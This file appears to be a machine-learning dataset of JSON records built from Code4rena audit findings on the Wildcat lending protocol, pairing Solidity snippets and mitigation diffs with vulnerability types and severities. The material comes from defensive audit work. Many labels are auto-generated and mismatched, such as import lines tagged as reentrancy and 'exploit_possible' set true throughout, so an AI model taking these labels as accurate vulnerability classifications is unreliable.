    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsEscrow.sol#L33-L44 function releaseEscrow() public override { if (!canReleaseEscrow()) revert CanNotReleaseEscrow(); uint256 amount = balance(); address _account = account;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.306,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function executeWithdrawal(\n    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n      accountAddress,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketWithdrawals.sol#L194-L211 function executeWithdrawal( address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.549,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n  function executeWithdrawal(\n-    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n-     accountAddress,\n+     msg.sender,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Apply some sort of access control to `WildcatMarketWithdrawals#executeWithdrawal()` by using `msg.sender` as the lender's address instead: function executeWithdrawal( -    address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.564,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function setCredential(\n    LenderStatus memory status,\n    RoleProvider provider,\n    uint256 timestamp\n  ) internal pure {\n    // User is approved, update status with new expiry and last provider\n    status.lastApprovalTimestamp = uint32(timestamp);\n    status.lastProvider = provider.providerAddress();\n    status.canRefresh = provider.isPullProvider();\n  }\n\n  function unsetCredential(LenderStatus memory status) internal pure {\n    status.canRefresh = false;\n    status.lastApprovalTimestamp = 0;\n    status.lastProvider = address(0);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L54-L70 function setCredential( LenderStatus memory status, RoleProvider provider, uint256 timestamp",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.556,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    uint256 allowed = allowance[from][msg.sender];\n\n    // Saves gas for unlimited approvals.\n    if (allowed != type(uint256).max) {\n      uint256 newAllowance = allowed - amount;\n      _approve(from, msg.sender, newAllowance);\n    }\n\n    _transfer(from, to, amount, 0x64);\n\n    return true;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L49-L66 function transferFrom( address from, address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.457,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function transfer(\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    _transfer(msg.sender, to, amount, 0x44);\n    return true;\n  }\n\n  function _transfer(address from, address to, uint256 amount, uint baseCalldataSize) internal virtual {\n    MarketState memory state = _getUpdatedState();\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n\n    if (scaledAmount == 0) revert_NullTransferAmount();\n\n    hooks.onTransfer(from, to, scaledAmount, state, baseCalldataSize);\n\n    Account memory fromAccount = _getAccount(from);\n    fromAccount.scaledBalance -= scaledAmount;\n    _accounts[from] = fromAccount;\n\n    Account memory toAccount = _getAccount(to);\n    toAccount.scaledBalance += scaledAmount;\n    _accounts[to] = toAccount;\n\n    _writeState(state);\n    emit_Transfer(from, to, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Protocol has both underlying  and market tokens. Lenders deposit underlying tokens and get market tokens, which earn interest. When they want to withdraw their assets, they will burn their market tokens and get the underlying tokens back with some interest. All of the internal accounting is made with these market tokens and they are tracked as scaled balances. Market tokens are minted and burned and these actions affect scaledTotalSupply. Market tokens can also be transferred between accounts like a regular ERC20 token. See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L41-L90 function transfer( address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.881,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function totalAssets() public view returns (uint256) {\n    return asset.balanceOf(address(this));\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L295-L300 function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); } This function is used to get the total balance in underlying asset and it does this by querying the `balanceOf()` method, issue however is that not all ERC20 support the `balanceOf()`, for eg Aura stash tokens, which stalls adoption and make protocol unusable with these tokens.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction deposit(uint256 amount) external virtual {\n  uint256 actualAmount = depositUpTo(amount);\n  // Remove the following check\n  // if (amount != actualAmount) { \n  //   revert MaxSupplyExceeded();\n  // }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Remove the redundant check in the `deposit()` function, as `depositUpTo()` already handles the maximum supply limit: function deposit(uint256 amount) external virtual { uint256 actualAmount = depositUpTo(amount); // Remove the following check // if (amount != actualAmount) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.219,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function depositUpTo(\n    uint256 amount\n  ) external virtual sphereXGuardExternal returns (uint256 /* actualAmount */) {\n    return _depositUpTo(amount);\n  }\n    function _depositUpTo(\n    uint256 amount\n  ) internal virtual nonReentrant returns (uint256 /* actualAmount */) {\n    // Get current state\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_DepositToClosedMarket();\n\n    // Reduce amount if it would exceed totalSupply\n    amount = MathUtils.min(amount, state.maximumDeposit());\n\n    // Scale the mint amount\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n    if (scaledAmount == 0) revert_NullMintAmount();\n\n    // Cache account data and revert if not authorized to deposit.\n    Account memory account = _getAccount(msg.sender);\n\n    hooks.onDeposit(msg.sender, scaledAmount, state);\n\n    // Transfer deposit from caller\n    asset.safeTransferFrom(msg.sender, address(this), amount);\n\n    account.scaledBalance += scaledAmount;\n    _accounts[msg.sender] = account;\n\n    emit_Transfer(_runtimeConstant(address(0)), msg.sender, amount);\n    emit_Deposit(msg.sender, amount, scaledAmount);\n\n    // Increase supply\n    state.scaledTotalSupply += scaledAmount;\n\n    // Update stored state\n    _writeState(state);\n\n    return amount;\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L104-L108 function depositUpTo( uint256 amount ) external virtual sphereXGuardExternal returns (uint256 /* actualAmount */) { return _depositUpTo(amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 44,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    uint256 currentlyHeld = totalAssets();\n    uint256 totalDebts = state.totalDebts();\n    if (currentlyHeld < totalDebts) {\n      // Transfer remaining debts from borrower\n      uint256 remainingDebt = totalDebts - currentlyHeld;\n      _repay(state, remainingDebt, 0x04);\n      currentlyHeld += remainingDebt;\n    } else if (currentlyHeld > totalDebts) {\n      uint256 excessDebt = currentlyHeld - totalDebts;\n      // Transfer excess assets to borrower\n      asset.safeTransfer(borrower, excessDebt);\n      currentlyHeld -= excessDebt;\n    }\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    state.timeDelinquent = 0;\n\n    // Still track available liquidity in case of a rounding error\n    uint256 availableLiquidity = currentlyHeld -\n      (state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);\n\n    // If there is a pending withdrawal batch which is not fully paid off, set aside\n    // up to the available liquidity for that batch.\n    if (state.pendingWithdrawalExpiry != 0) {\n      uint32 expiry = state.pendingWithdrawalExpiry;\n      WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n      if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n        (, uint128 normalizedAmountPaid) = _applyWithdrawalBatchPayment(\n          batch,\n          state,\n          expiry,\n          availableLiquidity\n        );\n        availableLiquidity -= normalizedAmountPaid;\n        _withdrawalData.batches[expiry] = batch;\n      }\n    }\n\n    uint256 numBatches = _withdrawalData.unpaidBatches.length();\n    for (uint256 i; i < numBatches; i++) {\n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity);\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    }\n\n    if (state.scaledPendingWithdrawals != 0) {\n      revert_CloseMarketWithUnpaidWithdrawals();\n    }\n\n    _writeState(state);\n    emit_MarketClosed(block.timestamp);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 65,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function registerControllerFactory(address factory) external onlyOwner {\n    if (!_controllerFactories.add(factory)) {\n      revert ControllerFactoryAlreadyExists();\n    }\n    _addAllowedSenderOnChain(factory);\n    emit ControllerFactoryAdded(factory);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L245-L251 function registerControllerFactory(address factory) external onlyOwner { if (!_controllerFactories.add(factory)) { revert ControllerFactoryAlreadyExists(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function removeSanctionOverride(address account) public override {\n    sanctionOverrides[msg.sender][account] = false;\n    emit SanctionOverrideRemoved(msg.sender, account);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsSentinel.sol#L104-L107 function removeSanctionOverride(address account) public override { sanctionOverrides[msg.sender][account] = false; emit SanctionOverrideRemoved(msg.sender, account); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.189,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function setAnnualInterestAndReserveRatioBips(\n    uint16 _annualInterestBips,\n    uint16 _reserveRatioBips\n  ) external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.isClosed) revert_AprChangeOnClosedMarket();\n\n    uint256 initialReserveRatioBips = state.reserveRatioBips;\n\n    (_annualInterestBips, _reserveRatioBips) = hooks.onSetAnnualInterestAndReserveRatioBips(\n      _annualInterestBips,\n      _reserveRatioBips,\n      state\n    );\n\n    if (_annualInterestBips > BIP) {\n      revert_AnnualInterestBipsTooHigh();\n    }\n\n    if (_reserveRatioBips > BIP) {\n      revert_ReserveRatioBipsTooHigh();\n    }\n\n    if (_reserveRatioBips < initialReserveRatioBips) {\n      if (state.liquidityRequired() > totalAssets()) {\n        revert_InsufficientReservesForOldLiquidityRatio();\n      }\n    }\n    state.reserveRatioBips = _reserveRatioBips;\n    state.annualInterestBips = _annualInterestBips;\n    if (_reserveRatioBips > initialReserveRatioBips) {\n      if (state.liquidityRequired() > totalAssets()) {\n        revert_InsufficientReservesForNewLiquidityRatio();\n      }\n    }\n\n    _writeState(state);\n    emit_AnnualInterestBipsUpdated(_annualInterestBips);\n    emit_ReserveRatioBipsUpdated(_reserveRatioBips);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketConfig.sol#L123-L163 function setAnnualInterestAndReserveRatioBips( uint16 _annualInterestBips, uint16 _reserveRatioBips ) external onlyBorrower nonReentrant sphereXGuardExternal {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    //snip\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    // ..snip\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState(); if (state.isClosed) revert_MarketAlreadyClosed(); //snip",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.506,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nimport './libraries/LibERC20.sol';\nimport './interfaces/IWildcatArchController.sol';\nimport './libraries/LibStoredInitCode.sol';\nimport './libraries/MathUtils.sol';\nimport './ReentrancyGuard.sol';\nimport './interfaces/WildcatStructsAndEnums.sol';\nimport './access/IHooks.sol';\nimport './IHooksFactory.sol';\nimport './types/TransientBytesArray.sol';\nimport './spherex/SphereXProtectedRegisteredBase.sol';\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Multiple instances in scope, for example take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L4-L13 import './libraries/LibERC20.sol'; import './interfaces/IWildcatArchController.sol'; import './libraries/LibStoredInitCode.sol'; import './libraries/MathUtils.sol';",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.413,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "  /**\n   * @dev Saturation addition. Add `a` to `b` and return the result\n   *      if it is less than `maxValue` or `maxValue` if it overflows.\n   */\n  function satAdd(uint256 a, uint256 b, uint256 maxValue) internal pure returns (uint256 c) {\n    unchecked {\n      c = a + b;\n      return ternary(c < maxValue, c, maxValue);\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/RoleProvider.sol#L37-L42 function calculateExpiry( RoleProvider provider, uint256 timestamp ) internal pure returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.337,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nThis function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L36-L38 function hasCredential(LenderStatus memory status) internal pure returns (bool) { return status.lastApprovalTimestamp > 0; } This function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the `lastApprovalTimestamp` being more than `0`, but when granting the credential the `lastApprovalTimestamp` is set to non-zero.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.187,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nNow contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Per the readMe protocol is to also deploy on multiple optimistic chains see: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L254 | Chains the protocol will be deployed on | Ethereum, Base, Arbitrum, Polygon | Now contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5 // SPDX-License-Identifier: MIT",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.205,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "addAllowedSenderOnChainCalldata",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "| Issue Number | Title |",
    "description": "|--------------|-----------------------------------------| | [L-01](#l-01---incorrect-packing-of-strings-in-_packstring) | Incorrect Packing of Strings in `_packString` | | [L-02](#l-02---incorrect-salt-validation-in-_deploymarket) | Incorrect Salt Validation in `_deployMarket` | | [L-03](#l-03---potential-initialization-code-length-miscalculation-in-_deployhooksinstance) | Potential Initialization Code Length Miscalculation in `_deployHooksInstance` | | [L-04](#l-04---missing-access-control-on-pushprotocolfeebipsupdates-function) | Missing Access Control on `pushProtocolFeeBipsUpdates` Function |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_deployHooksInstance",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-03] - Potential Initialization Code Length Miscalculation in `_deployHooksInstance`",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "pushProtocolFeeBipsUpdates",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-04] - Missing Access Control on `pushProtocolFeeBipsUpdates` Function",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction pushProtocolFeeBipsUpdates(\n    address hooksTemplate,\n    uint marketStartIndex,\n    uint marketEndIndex\n) public override nonReentrant {\n    // Function logic\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Description:",
    "description": "The [`pushProtocolFeeBipsUpdates` function](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L553-L587) lacks access control modifiers, allowing any external user to call it. This can lead to unauthorized modifications of protocol fee configurations across multiple markets associated with a hooks template. https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L553-L587 **Exact Code Snippet:** function pushProtocolFeeBipsUpdates( address hooksTemplate,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.181,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "pushProtocolFeeBipsUpdates",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Recommendation:",
    "description": "Restrict access to the `pushProtocolFeeBipsUpdates` function by adding appropriate access control, such as the `onlyArchControllerOwner` modifier, to ensure that only authorized entities can perform fee updates. ---",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "addAllowedSenderOnChainCalldata",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-06} - Potential Misplacement of Account in `addAllowedSenderOnChainCalldata`",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
